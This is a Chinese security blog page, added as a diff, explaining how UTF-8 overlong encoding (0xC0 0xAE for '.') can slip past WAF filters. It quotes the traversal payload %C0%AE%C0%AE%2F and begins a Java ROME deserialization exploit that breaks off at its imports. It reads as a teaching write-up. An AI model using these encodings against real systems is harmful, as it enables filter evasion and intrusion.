@@ -1,0 +1,2379 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>UTF-8 Overlong Encodeing 绕过WAF | Godown_blog</title>
+
+  <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    <link href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css" rel="stylesheet">
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
+
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script defer src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+    
+    <!-- 依赖于jquery和vue -->
+    
+        <script src="https://unpkg.com/jquery@3.5.1/dist/jquery.min.js"></script>
+    
+
+    
+        <script src="https://unpkg.com/vue@2.6.11/dist/vue.min.js"></script>
+    
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Godown_blog" type="application/atom+xml">
+</head>
+
+  
+  <!-- 预加载动画 -->
+  <!-- 页面预加载动画 -->
+
+  
+    <div class="preloader_2" id="loader">
+  <div class="loader"></div>
+</div>
+
+  
+<script>
+  var endLoading = function () {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('DOMContentLoaded',endLoading);
+</script>
+
+  <body>
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (src) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://unpkg.com/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header  " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+      <h3 class="drawer-box-head_title">Godown_blog</h3>
+      <h5 class="drawer-box-head_desc">山水为竭，冬雷震震</h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/archives" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/tags" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/categories" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/friends" class="drawer-menu-item-link">
+                  
+                  <span class="name">友情链接</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="javascript:;" class="drawer-menu-item-link has-children" @click="openOrCloseMenu(5)">
+                  <span>
+                    
+                      <i class="fas fa-link"></i>
+                    
+                    <span class="name">更多</span>
+                  </span>
+                  <i class="fas fa-chevron-left arrow " :class="{'icon-rotate': isOpen(5)}" aria-hidden="true"></i>
+                </a>
+                <ul class="drawer-sub-menu" v-if="isOpen(5)">
+                  
+                  <li>
+                    <a href="/gallery">
+                      
+                      <i class="fas fa-music" style="margin-top: -20px;"></i>
+                      
+                      <span>图库</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/friends">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>友情连接</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/about">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>关于我</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a target="_blank" rel="noopener" href="http://baidu.com">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>百度</span>
+                    </a>
+                  </li>
+                  
+                </ul>
+              
+            </li>
+          
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/godownio">
+              <i class="fas fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">Godown_blog</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/" class="menu-item-link" title="首页">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/archives" class="menu-item-link" title="归档">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/tags" class="menu-item-link" title="标签">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/categories" class="menu-item-link" title="分类">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/friends" class="menu-item-link" title="友情链接">
+                  
+                  <span class="name">友情链接</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="javascript:;" class="menu-item-link" title="更多">
+                  
+                    <i class="fas fa-link"></i>
+                  
+                  <span class="name">更多</span>
+                  <i class="fas fa-chevron-down arrow" aria-hidden="true"></i>
+                </a>
+                <ul class="sub-menu">
+                  
+                  <li>
+                    <a href="/gallery">
+                      
+                      <i class="fas fa-music" style="margin-top: -20px;"></i>
+                      
+                      <span>图库</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/friends">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>友情连接</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/about">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>关于我</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a target="_blank" rel="noopener" href="http://baidu.com">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>百度</span>
+                    </a>
+                  </li>
+                  
+                </ul>
+              
+            </li>
+          
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">本地搜索</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="请输入关键字"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/godownio" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+ <!-- prismjs 代码高亮 -->
+ 
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8162.png')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        UTF-8 Overlong Encodeing 绕过WAF
+      </span>
+    </div>
+    
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="post-detail-content post-row" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h1 id="UTF-8-Overlong-Encodeing-绕过WAF"><a href="#UTF-8-Overlong-Encodeing-绕过WAF" class="headerlink" title="UTF-8 Overlong Encodeing 绕过WAF"></a>UTF-8 Overlong Encodeing 绕过WAF</h1><h2 id="Unicode-到-UTF-8"><a href="#Unicode-到-UTF-8" class="headerlink" title="Unicode 到 UTF-8"></a>Unicode 到 UTF-8</h2><p>引用一段来自dicksuck的回答</p>
+<p>Unicode 字符到 UTF-8 编码的转换遵循一套清晰但精妙的规则。其核心思想是：<strong>根据 Unicode 码点（Code Point）所处的数值范围，决定使用多少个字节（1 到 4 个）进行编码，并按照特定模式填充这些字节的位。</strong> UTF-8 的设计巧妙地实现了对 ASCII 的完全兼容，并支持表示整个 Unicode 码空间（U+0000 到 U+10FFFF）。</p>
+<p>以下是详细的转换步骤和规则：</p>
+<ol>
+<li><p><strong>确定 Unicode 码点：</strong></p>
+<ul>
+<li>每个字符在 Unicode 标准中都有一个唯一的编号，称为码点。</li>
+<li>码点通常用十六进制表示，前缀 <code>U+</code>。例如：<ul>
+<li><code>&#39;A&#39;</code> (拉丁字母 A) 的码点是 <code>U+0041</code></li>
+<li><code>&#39;€&#39;</code> (欧元符号) 的码点是 <code>U+20AC</code></li>
+<li><code>&#39;中&#39;</code> (中文“中”) 的码点是 <code>U+4E2D</code></li>
+<li><code>&#39;😂&#39;</code> (笑哭表情) 的码点是 <code>U+1F602</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>根据码点范围确定所需字节数：</strong><br>UTF-8 根据码点值的大小将其编码为 1 到 4 个字节。范围划分如下：</p>
+<table>
+<thead>
+<tr>
+<th>Unicode 码点范围 (十六进制)</th>
+<th>Unicode 码点范围 (十进制)</th>
+<th>UTF-8 字节序列 (二进制)</th>
+<th>所需字节数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>U+0000</code> - <code>U+007F</code></td>
+<td><code>0</code> - <code>127</code></td>
+<td><code>0xxxxxxx</code></td>
+<td>1</td>
+</tr>
+<tr>
+<td><code>U+0080</code> - <code>U+07FF</code></td>
+<td><code>128</code> - <code>2047</code></td>
+<td><code>110xxxxx 10xxxxxx</code></td>
+<td>2</td>
+</tr>
+<tr>
+<td><code>U+0800</code> - <code>U+FFFF</code></td>
+<td><code>2048</code> - <code>65535</code></td>
+<td><code>1110xxxx 10xxxxxx 10xxxxxx</code></td>
+<td>3</td>
+</tr>
+<tr>
+<td><code>U+10000</code> - <code>U+10FFFF</code></td>
+<td><code>65536</code> - <code>1114111</code></td>
+<td><code>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</code></td>
+<td>4</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>第一列：</strong> Unicode 码点所处的范围。</li>
+<li><strong>第二列：</strong> 码点的十进制表示（帮助理解范围大小）。</li>
+<li><strong>第三列：</strong> UTF-8 编码的<strong>模板</strong>。<code>x</code> 表示用于存放码点二进制位的比特位。</li>
+<li><strong>第四列：</strong> 编码这个范围内的码点所需的字节数量。</li>
+</ul>
+</li>
+<li><p><strong>将码点转换为二进制：</strong></p>
+<ul>
+<li>将码点的十六进制值转换为二进制形式。</li>
+<li>根据上一步确定的字节数，<strong>从低位向高位</strong>（从右向左）提取出所需的比特位。如果二进制位数不足模板中 <code>x</code> 的总数，则在<strong>高位</strong>（左边）补零。</li>
+</ul>
+</li>
+<li><p><strong>填充 UTF-8 字节序列模板：</strong></p>
+<ul>
+<li>将上一步提取出的二进制位（包括补的零），<strong>从低位到高位</strong>（从右向左），依次填入模板中 <code>x</code> 的位置。</li>
+<li><strong>重要规则：</strong><ul>
+<li><strong>首字节：</strong> 模板中第一个字节开头的 <code>1</code> 的个数（<code>110...</code>, <code>1110...</code>, <code>11110...</code>）明确指示了这个字符使用了多少个字节。<code>0...</code> 表示单字节。</li>
+<li><strong>后续字节：</strong> 所有后续字节<strong>必须</strong>以 <code>10</code> 开头。这是 UTF-8 的一个重要特征，用于区分一个字节是某个字符编码序列的起始字节还是后续字节。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>得到最终的 UTF-8 字节序列：</strong></p>
+<ul>
+<li>填充完成后，你就得到了代表该 Unicode 字符的 UTF-8 编码字节序列。这个序列可以存储在文件、网络传输或在内存中表示该字符串。</li>
+</ul>
+</li>
+</ol>
+<p><strong>详细示例：</strong></p>
+<ol>
+<li><strong>示例 1: <code>&#39;A&#39;</code> (U+0041) - 1 字节</strong><ul>
+<li>码点： <code>U+0041</code> (十六进制) &#x3D; <code>65</code> (十进制)</li>
+<li>范围： <code>0 - 127</code> -&gt; <strong>1 字节</strong></li>
+<li>模板： <code>0xxxxxxx</code></li>
+<li>码点二进制： <code>65</code> &#x3D; <code>1000001</code> (二进制，7位)</li>
+<li>填充模板： 模板要求 7 个 <code>x</code> (<code>0xxxxxxx</code>)。将 <code>1000001</code> 填入 <code>x</code> 的位置 -&gt; <code>01000001</code></li>
+<li>UTF-8 字节序列 (十六进制)： <code>0x41</code> (等同于 ASCII <code>&#39;A&#39;</code>)</li>
+<li>UTF-8 字节序列 (二进制)： <code>01000001</code></li>
+</ul>
+</li>
+<li><strong>示例 2: <code>&#39;¢&#39;</code> (分币符号, U+00A2) - 2 字节</strong><ul>
+<li>码点： <code>U+00A2</code> (十六进制) &#x3D; <code>162</code> (十进制)</li>
+<li>范围： <code>128 - 2047</code> -&gt; <strong>2 字节</strong></li>
+<li>模板： <code>110xxxxx 10xxxxxx</code></li>
+<li>码点二进制： <code>162</code> &#x3D; <code>10100010</code> (二进制，8位)</li>
+<li>填充模板：<ul>
+<li>模板 <code>x</code> 总位数： 5 (第一个字节) + 6 (第二个字节) &#x3D; 11 位。</li>
+<li>码点二进制 <code>10100010</code> 只有 8 位，需要在<strong>高位补 3 个零</strong>： <code>000 10100010</code> -&gt; 补零后为 <code>00010100010</code> (11位)。</li>
+<li>将这 11 位 <strong>从低位到高位</strong> 填入模板的 <code>x</code>：<ul>
+<li>低 6 位 (<code>100010</code>) 填入第二个字节的 <code>10xxxxxx</code> -&gt; <code>10100010</code></li>
+<li>剩下的高 5 位 (<code>00010</code>) 填入第一个字节的 <code>110xxxxx</code> -&gt; <code>11000010</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>UTF-8 字节序列 (十六进制)： <code>0xC2 0xA2</code></li>
+<li>UTF-8 字节序列 (二进制)： <code>11000010 10100010</code></li>
+</ul>
+</li>
+</ol>
+<p><strong>示例 3: <code>&#39;中&#39;</code> (U+4E2D) - 3 字节</strong></p>
+<ul>
+<li>码点： <code>U+4E2D</code> (十六进制) &#x3D; <code>20013</code> (十进制)</li>
+<li>范围： <code>2048 - 65535</code> -&gt; <strong>3 字节</strong></li>
+<li>模板： <code>1110xxxx 10xxxxxx 10xxxxxx</code></li>
+<li>码点二进制： <code>20013</code> &#x3D; <code>0100111000101101</code> (二进制，16位。十六进制 <code>4E2D</code> &#x3D; <code>0100 1110 0010 1101</code>)</li>
+<li>填充模板：<ul>
+<li>模板 <code>x</code> 总位数： 4 + 6 + 6 &#x3D; 16 位。码点正好 16 位，无需补零。</li>
+<li>将这 16 位 <strong>从低位到高位</strong> 填入模板的 <code>x</code>：<ul>
+<li>低 6 位 (<code>101101</code>) 填入第三个字节的 <code>10xxxxxx</code> -&gt; <code>10101101</code></li>
+<li>中间 6 位 (<code>111000</code>) 填入第二个字节的 <code>10xxxxxx</code> -&gt; <code>10111000</code></li>
+<li>高 4 位 (<code>0100</code>) 填入第一个字节的 <code>1110xxxx</code> -&gt; <code>11100100</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>UTF-8 字节序列 (十六进制)： <code>0xE4 0xB8 0xAD</code></li>
+<li>UTF-8 字节序列 (二进制)： <code>11100100 10111000 10101101</code></li>
+</ul>
+<p>模板是固定给出的</p>
+<h2 id="Overlong-Encoding是什么？"><a href="#Overlong-Encoding是什么？" class="headerlink" title="Overlong Encoding是什么？"></a>Overlong Encoding是什么？</h2><p>Overlong Encoding就是将1个字节的字符，按照UTF-8编码方式强行编码成2位以上UTF-8字符的方法。</p>
+<p>比如点号<code>.</code>，其unicode编码和ascii编码一致，均为<code>0x2E</code>，按照上表，它只能被编码成单字节的UTF-8字符，按照单字节编码方案：</p>
+<ul>
+<li><code>U+002E</code>的二进制是<code>101110</code></li>
+<li>模板 <code>0xxxxxxx</code>，x 总位数7，高位补0成为<code>0101110</code></li>
+<li>填入1字节模板：<code>0xxxxxxx</code> → <code>00101110</code>（十六进制<code>0x2E</code>）。</li>
+</ul>
+<p>如果强行将<code>U+002E</code>（本应用1字节编码）当作一个更大码点（在<code>U+0080</code>-<code>U+07FF</code>范围内）来处理呢？并使用双字节UTF-8模板编码。</p>
+<ul>
+<li><p><strong>步骤</strong>：</p>
+<ol>
+<li><strong>码点值不变</strong>：仍是<code>U+002E</code>（二进制<code>00101110</code>，但双字节编码需要11位有效负载）。</li>
+<li><strong>高位补0</strong>：为了“适配”双字节范围，在码点高位补0，扩展成11位：<code>00000101110</code>（相当于十进制46，但二进制表示为11位：<code>00000</code> + <code>101110</code>）。</li>
+<li><strong>填入双字节模板</strong>：<ul>
+<li>UTF-8双字节模板：<code>110xxxxx 10xxxxxx</code>（用于码点<code>U+0080</code>-<code>U+07FF</code>）。</li>
+<li>高5位（<code>xxxxx</code>）取自扩展后的高5位：<code>00000</code>。</li>
+<li>低6位（<code>xxxxxx</code>）取自扩展后的低6位：<code>101110</code>。</li>
+<li>结果：<ul>
+<li>第一个字节：<code>110</code> + <code>00000</code> &#x3D; <code>11000000</code>（十六进制<code>0xC0</code>）。</li>
+<li>第二个字节：<code>10</code> + <code>101110</code> &#x3D; <code>10101110</code>（十六进制<code>0xAE</code>）。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>最终序列：<code>0xC0 0xAE</code>。</li>
+</ul>
+</li>
+</ul>
+<p><strong>关键问题：这个序列是否有效？</strong></p>
+<ul>
+<li><strong>绝对无效，且违反UTF-8标准</strong>。<ul>
+<li><strong>原因1：违反“最短形式”规则（Shortest Form Requirement）</strong>：<ul>
+<li>UTF-8标准强制要求字符必须使用最小可能字节数编码。<code>U+002E</code>完全可以用1字节（<code>0x2E</code>）表示，使用双字节（<code>0xC0 0xAE</code>）是“过长编码”（Overlong Encoding）。</li>
+<li>正规UTF-8解码器（如Python、Java、现代浏览器）会将其视为非法序列，并抛出错误或替换为占位符（如<code>�</code>）。</li>
+</ul>
+</li>
+<li><strong>原因2：码点范围不匹配</strong>：<ul>
+<li>双字节UTF-8序列仅适用于码点<code>U+0080</code>及以上（≥128）。<code>U+002E</code>（46）小于128，不属于该范围。</li>
+</ul>
+</li>
+<li><strong>原因3：安全性风险</strong>：<ul>
+<li>这种序列可能被恶意利用（如注入攻击）。历史上，某些旧系统（如早期Internet Explorer）错误地将<code>0xC0 0xAE</code>解释为点号，允许攻击者绕过安全检查（例如，在URL中编码<code>../</code>为<code>%C0%AE%C0%AE%2F</code>实现目录遍历）。但现代系统已修复此问题。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>现代UTF-8解码器（如Python的<code>decode(&#39;utf-8&#39;)</code>、JavaScript的<code>TextDecoder</code>）会检测到<code>0xC0 0xAE</code>是过长序列，并报错：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;\xC0\xAE&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 抛出 UnicodeDecodeError: invalid start byte</span></span><br></pre></td></tr></table></figure>
+
+<p>但是在Java中，就可能存在问题</p>
+<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>比如随便找个rome链，我们对其序列化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.third.rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 